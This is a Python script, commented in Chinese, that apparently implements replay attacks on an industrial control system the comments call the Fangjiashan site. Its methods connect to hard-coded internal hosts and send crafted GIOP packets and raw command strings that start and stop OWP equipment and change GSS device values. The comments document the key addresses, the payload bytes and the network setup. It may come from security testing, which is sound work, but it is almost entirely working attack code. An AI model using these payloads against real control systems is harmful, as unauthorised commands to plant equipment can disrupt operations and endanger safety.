from scapy.layers.inet import *
from scapy.arch.pcapdnet import L3pcapSocket
from protocols.packet_giop import *
import socket


# 此类中的方法，用于实现方家山现场系统的回放攻击
class TestFangJiaShan(object):
    def __init__(self):
        pass

    # 在 test() 方法中调用不同的测试方法
    def test(self):
        # self.test_sas_stop_owp1()
        self.test_sas_start_owp1()
        # self.test_sas_start_owp5()
        # self.test_sas_stop_owp5()
        # self.test_cfr_aw_165vl_change_value()
        # self.test_cfr_aw_190p0_start()
        # self.test_send_idl_db_locked_multiple_write_190po()
        # self.test_send_idl_db_locked_multiple_write_165vl()

    '''
    功能：测试主机连接到CCT，使用GIOP协议下发OWP5启动命令
    说明：现场环境中，与CCT通信的是SAS
         实际流量中，SAS通过一条TCP长连接，向CCT发送命令包
         CCT接到命令包后，会根据执行过程的进展，通过另一条TCP长连接向SAS反馈执行状态
         而此方法模拟SAS端，首先与CCT建立TCP连接，之后发送GIOP请求包（idl_execute_command）
         后续的状态反馈同样通过另一条TCP连接返回给SAS
    注意：不同的SAS操作（启/停各类2层设备）都使用'idl_execute_command'命令包
         同一种方法（即：方法名相同），在不同服务器上（例如：CCT1和CCT2）对应的KeyAddress字段值不同
         不同的操作（例如：启动OWP5和停止OWP5），使用的负载（StubData字段）不同
    【重要】：使用脚本与CCT等现场设备建立TCP连接前，需要首先配置本机的静态IPv4地址
            例如：CCT1的IP地址为192.168.69.101
                 与CCT1建立TCP连接前，需要配置本机IP地址为192.168.69.xxx（此网段内未使用的IP地址），子网掩码为255.255.255.0
                 即测试主机与CCT1服务器处于同一网段，此外，测试主机连接交换机的端口不能是镜像口
    '''
    def test_sas_start_owp5(self):
        #        ip              port   KeyAddress
        # cct1:  192.168.69.101  11900  14010f00525354d4d88b5f86a90100030000000100000004000000
        # cct2:  192.168.69.102  12900  14010f00525354ced88b5f34c10c00030000000100000004000000
        # 与CCT2建立TCP连接
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ## 方家山的CCT的IP是192.168.69.102，使用端口12900。
        ## TODO: 武汉研究所的CCT只有一台(master)，没有slave，是192.168.69.101，使用端口11900
        skt.connect(('192.168.69.101', 11900))

        # 封装GIOP命令数据包
        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f00525354ced88b5f34c10c00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034380065010000002e0000002461646163735f7066612f636f6d'
                                '5f636d642f67656e6572616c5f737461727475705f6d616e616765722e73'
                                '6800000001000000090000006b69632d6f77703500000000020000000000'
                                '0000'
                                )
                   )

        # 发送至网络
        skt.send(bytes(pkt))

        print('Sleeping... 3s')
        time.sleep(3)

        # 关闭socket
        skt.close()

    # 功能：OWP5停止，测试主机连接到CCT，使用GIOP协议下发命令
    def test_sas_stop_owp5(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.101', 11900))

        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f00525354ced88b5f34c10c00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034390065010000002b0000002461646163735f7066612f636f6d5f636d642f67656'
                                'e6572616c5f73746f705f6d616e616765722e7368000001000000090000006b69632d6f7770'
                                '35000000000200000000000000')
                   )

        skt.send(bytes(pkt))

        print('Sleeping... 3s')
        time.sleep(3)
        skt.close()

    def test_sas_stop_owp1(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.101', 11900))
        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f005253547f0c926117860b00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034390065010000002b0000002461646163735f7066612f636f6d5f636d642f67656'
                                'e6572616c5f73746f705f6d616e616765722e7368000001000000090000006b69632d6f7770'
                                '31000000000200000000000000')
                   )
        skt.send(bytes(pkt))
        print('Sleeping... 3s')
        time.sleep(3)
        skt.close()


    def test_sas_start_owp1(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.101', 11900))
        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f005253547f0c926117860b00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034380065010000002e0000002461646163735f7066612f636f6d5f636d642f67656'
                                'e6572616c5f737461727475705f6d616e616765722e736800000001000000090000006b6963'
                                '2d6f777031000000000200000000000000'
                                )
                   )
        skt.send(bytes(pkt))
        print('Sleeping... 3s')
        time.sleep(3)
        skt.close()


    # 功能：修改GSS-165VL设备值，测试主机连接到AW，使用TCP负载下发命令
    # 说明：CFR-AW段的流量，做回放攻击时，可通过连接到AW的TCP连接下发命令，命令数据包形式即TCP直传的字符串负载
    def test_cfr_aw_165vl_change_value(self):
        skt_aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        skt_aw.connect(('192.168.1.1', 45678))

        # 负载第二行行尾处的最后一个参数（'59'），即表示将设备值修改为 59
        pkt_aw = '[26 (uwrite, 1, 0, 1)]\x0a' \
                 '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 3,             59)]\x0a' \
                 '[-1(1)]\x0a\x00'
        skt_aw.send(bytes(pkt_aw, encoding='utf-8'))

        print('Sleeping... 0.5s')
        time.sleep(0.5)

        print('Sleeping... 3s')
        time.sleep(3)
        skt_aw.close()

    # 功能：启停GSS-190PO设备，测试主机连接到AW，使用TCP负载下发命令
    def test_cfr_aw_190p0_start(self):
        skt_aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt_aw.connect(('192.168.1.1', 45678))

        pkt_aw = '[26 (uwrite, 1, 0, 1)]\x0a' \
                 '[0 (  0,  0,314753535F4E393A313930504F5F432E4949303100, 9, -32768)]\x0a' \
                 '[-1(1)]\x0a\x00'
        # -32768: start, 16384: stop
        skt_aw.send(bytes(pkt_aw, encoding='utf-8'))

        print('Sleeping... 0.5s')
        time.sleep(0.5)

        print('Sleeping... 3s')
        time.sleep(3)
        skt_aw.close()

    # 功能：操作GSS-190PO设备，测试主机连接到SAR/STR，使用GIOP协议下发操作命令
    # 说明：实际测试时，发现只需要向SAR发送'idl_db_locked_multiple_write'包即可成功下发命令
    def test_send_idl_db_locked_multiple_write_190po(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.111', 10000))

        request_id = 30000
        pkt = GIOP(type='Request',
                   RequestID=request_id,
                   KeyAddress=h2b('14010f0052535440df8b5ff6120300040000000100000005000000'),
                   RequestOperation='idl_db_locked_multiple_write',
                   StubData=h2b(
                       'fc00000003702f93682e0200150000000800c0000004940101180000000100000008000000'))
        #                                                           93: auto:    切换自动
        #                                                           94: manual:  切换手动
        #                                                           95: stop:    停止
        #                                                           96: start:   启动
        #               1 2 3 4 5 6 7 8 9 10  12  14  16  18  20  22  24  26  28  30  32  34  36  38  40  42
        #                                   11  13  15  17  19  21  23  25  27  29  31  33  35  37  39  41  43
        print('Sending... 190po, payload: {}'.format(to_hex(pkt)))
        skt.send(bytes(pkt))

        print('Sleeping... 1s')
        time.sleep(1)
        skt.close()

    # 功能：操作GSS-165VL设备，测试主机连接到SAR/STR，使用GIOP协议下发操作命令
    def test_send_idl_db_locked_multiple_write_165vl(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.111', 10000))

        request_id = 30000
        pkt = GIOP(type='Request',
                   RequestID=request_id,
                   KeyAddress=h2b('14010f00525354f39d825f66c00300040000000100000005000000'),
                   RequestOperation='idl_db_locked_multiple_write',
                   StubData=h2b(
                       '0000000000000000000000001b0000001e00370001049c010200012e000000000000000600000000000000'))
        #                                                               01: 值+1
        #                                                               02: 值-1
        #                                                               03: 值+5
        #                                                               04: 值-5
        #               1 2 3 4 5 6 7 8 9 10  12  14  16  18  20  22  24  26  28  30  32  34  36  38  40  42
        #                                   11  13  15  17  19  21  23  25  27  29  31  33  35  37  39  41  43
        print('Sending... 165vl, payload: {}'.format(to_hex(pkt)))
        skt.send(bytes(pkt))

        print('Sleeping... 1s')
        time.sleep(1)
        skt.close()

if __name__ == '__main__':
    def run():
        # TestS5().test()
        TestFangJiaShan().test()
    run()
